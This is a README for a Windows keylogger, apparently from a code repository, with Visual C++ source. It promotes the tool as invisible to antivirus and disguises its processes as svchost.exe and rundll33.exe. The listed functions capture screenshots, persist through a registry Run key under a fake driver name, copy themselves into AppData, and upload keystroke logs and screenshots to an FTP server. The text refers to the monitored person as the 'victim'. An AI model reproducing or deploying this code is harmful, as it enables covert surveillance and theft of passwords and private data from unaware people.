# Keylogger

Keylogger is 100% invisible to the anitivirus software. Keylogger Monitors all keystokes, mouse clicks and with additional feature of screenshots. It has a seperate process which continues captures screenshot of the victim's display and sends it to the FTP Server in any given time. 

Keylogger is designed in Visual C++ and it runs in the background without anyone knowing whats going on(Hidden Window).

```
A Keylogger (short for keystroke logger) is software that tracks or logs the keys strokes on your keyboard, 
typically in a covert manner so that you don‚Äôt know that your actions are being monitored. 
This is usually done with malicious intent to collect your account information, credit card numbers,
user names, passwords, and other private data.
```

### FEATURES OF BLACKCAT KEYLOGGER

- Discrete/Tamper Proof :By design, Advance Keylogger is undetectable and thus cannot be tampered with or removed by kids/employees.

- Keystrokes Typed: See every keystroke typed even if it is deleted. This keystroke logger feature provides a reader-friendly version of all keystrokes logged along with the raw keylogging activity so you can see every detail. 

- Continuous Screenshots: Video-style playback of screenshots for programs and websites selected by you. For example, watch an email as it's being typed and edited instead of just seeing the finished product (1,000 screenshots included with purchase).

- FTP Server: Screenshot and keylogger Logfile which contain senstive user information send to ftp server (Mobile/Web/System). Powerful FTP Server also written in Core Visual C++.

- AutoStart : Keylogger has functionaility to auto execute on system bootup. It inserts entry on system startup program so it executes whenever the computer reboots.

- AutoCopy : Keylogger has functionaility to auto copy in %appdata%/roaming/wpdnse/ folder.

### Keylogger.Zip Contain two Executable Files. (Sourcecode File Also Included)

1. svchost.exe (Main Keylogger Processs)
2. rundll33.exe (Capture Screenshot & send all Log and Screenshot to FTP Server (ftp://192.168.8.2:2121))

Execute both files once and from the next time around, it will automatically start to capture the screenshots and the keylogs and send it to the FTP Server.

It is named "unrecognisable" in the Task Manager.

### How to Use ?

1. Start the FTP Server on This Ip Address 192.168.8.2:2121
2. Start both the programs and enjoy!

### Visual C++ Source Code

#### Capture Screenshot

```
void screenshot(string file){
	ULONG_PTR gdiplustoken;
	GdiplusStartupInput gdistartupinput;
	GdiplusStartupOutput gdistartupoutput;

	gdistartupinput.SuppressBackgroundThread = true;
	GdiplusStartup(& gdiplustoken,& gdistartupinput,& gdistartupoutput); //start GDI+

	HDC dc=GetDC(GetDesktopWindow());//get desktop content
	HDC dc2 = CreateCompatibleDC(dc);	 //copy context

	RECT rc0kno;

	GetClientRect(GetDesktopWindow(),&rc0kno);// get desktop size;
	int w = rc0kno.right-rc0kno.left;//width
	int h = rc0kno.bottom-rc0kno.top;//height

	HBITMAP hbitmap = CreateCompatibleBitmap(dc,w,h);//create bitmap
	HBITMAP holdbitmap = (HBITMAP) SelectObject(dc2,hbitmap);

	BitBlt(dc2, 0, 0, w, h, dc, 0, 0, SRCCOPY);//copy pixel from pulpit to bitmap
	Bitmap* bm= new Bitmap(hbitmap,NULL);

	UINT num;
	UINT size;

	ImageCodecInfo *imagecodecinfo;
	GetImageEncodersSize(&num,&size); //get count of codec

	imagecodecinfo = (ImageCodecInfo*)(malloc(size));
	GetImageEncoders (num,size,imagecodecinfo);//get codec

	CLSID clsidEncoder;

	for(int i=0; i < num; i++)
	{
		if(wcscmp(imagecodecinfo[i].MimeType,L"image/jpeg")==0)
			clsidEncoder = imagecodecinfo[i].Clsid;//get jpeg codec id

	}

	free(imagecodecinfo);

	wstring ws;
	ws.assign(file.begin(),file.end());//sring to wstring
	bm->Save(ws.c_str(),& clsidEncoder); //save in jpeg format
	SelectObject(dc2,holdbitmap);//Release Objects
	DeleteObject(dc2);
	DeleteObject(hbitmap);

	ReleaseDC(GetDesktopWindow(),dc);
	GdiplusShutdown(gdiplustoken);

}

```

#### Send Screenshot to Server Via FTP

```
void ftp_scrshot_send(){

	HINTERNET hInternet;
	HINTERNET hFtpSession;

	DWORD rec_timeout = 5000;

	hInternet = InternetOpen(NULL,INTERNET_OPEN_TYPE_DIRECT,NULL,NULL,0);
		if(hInternet == NULL){
			log_error_file<<"Error:"<<GetLastError();
		}
		else{
			hFtpSession = InternetConnect(hInternet,"192.168.8.2",2121,NULL,NULL,INTERNET_SERVICE_FTP,0,0);
			InternetSetOption(hInternet,INTERNET_OPTION_SEND_TIMEOUT,&rec_timeout,sizeof(rec_timeout));
			if(hFtpSession == NULL){

				log_error_file<<"Error:"<<GetLastError();
			}
			else{
				if(!FtpPutFile(hFtpSession,"core32.mni","hacks/sc/dc.jpg",FTP_TRANSFER_TYPE_BINARY,0)){
					log_error_file<<"Error:"<<GetLastError();
				}
			}	
		}

	log_error_file.close();
}
```
#### Send KeyLog Data to FTP Server

```
void ftplogsend(){


	HINTERNET hInternet;
	HINTERNET hFtpSession;

	DWORD rec_timeout = 2000;

	hInternet = InternetOpen(NULL,INTERNET_OPEN_TYPE_DIRECT,NULL,NULL,0);

		if(hInternet == NULL){
			log_error_file<<"Error:"<<GetLastError();
		}
		else{
			hFtpSession = InternetConnect(hInternet,"192.168.8.2",2121,NULL,NULL,INTERNET_SERVICE_FTP,0,0);
			InternetSetOption(hInternet,INTERNET_OPTION_SEND_TIMEOUT,&rec_timeout,sizeof(rec_timeout));


			if(hFtpSession == NULL){

				log_error_file<<"Error:"<<GetLastError();
			}
			else{
				if(!FtpPutFile(hFtpSession,"atapi.sys","hacks/hacks.txt",FTP_TRANSFER_TYPE_BINARY,0)){
					log_error_file<<"Error:"<<GetLastError();
					log_error_file.close();
				}
			}


		}
	}
```

#### Auto Copy in AppData Folder & Intialize Keylog Text File with Date Time Stamp

```
void AutoCopy(){

	string f_path = userlc;
	string f_name=f_path;
	f_name+="\\svchost.exe";//file name
	char my_name[260];
	GetModuleFileName(GetModuleHandle(0),my_name,260);//name of running process
	string f_my=my_name;
	CreateDirectory(f_path.c_str(),NULL);
	CopyFile(f_my.c_str(),f_name.c_str(),FALSE);

}

void Install(){

	SYSTEMTIME st;
	GetLocalTime(&st);
	int year = st.wYear;
	int month = st.wMonth;
	int day = st.wDay;
	int hour = st.wHour;
	int mintue = st.wMinute;

	string yearS =  to_string(year);
	yearS += "_";
	string monthS =  to_string(month);
	monthS += "-";
	string dayS =  to_string(day);
	dayS += "-";
	string hourS =  to_string(hour);
	hourS += "H-";
	string mintueS =  to_string(mintue);
	mintueS += "M------------>\n\n";

	string startDate = "\n\n";
	startDate += dayS + monthS + yearS + hourS + mintueS;
	char dateCh[260];
	strcpy(dateCh,startDate.c_str());


	string ff_path = userlc;
	char szDir[260];
	strcpy(szDir,ff_path.c_str());
	strcat(szDir,"atapi.sys");
	FILE *file;
	file = fopen(szDir, "a+");

	fputs(dateCh,file);
	fclose(file);

}
```

#### AutoStart on System Bootup

```
void AutoStart()
{
	char Driver[MAX_PATH];
	HKEY hKey;
	string ff_path = userlc + "svchost.exe";
	strcpy(Driver,ff_path.c_str());
	RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
	RegSetValueExA(hKey, "Windows Atapi x86_64 Driver", 0, REG_SZ, (const unsigned char *)Driver, MAX_PATH);
	RegCloseKey(hKey);
}
```
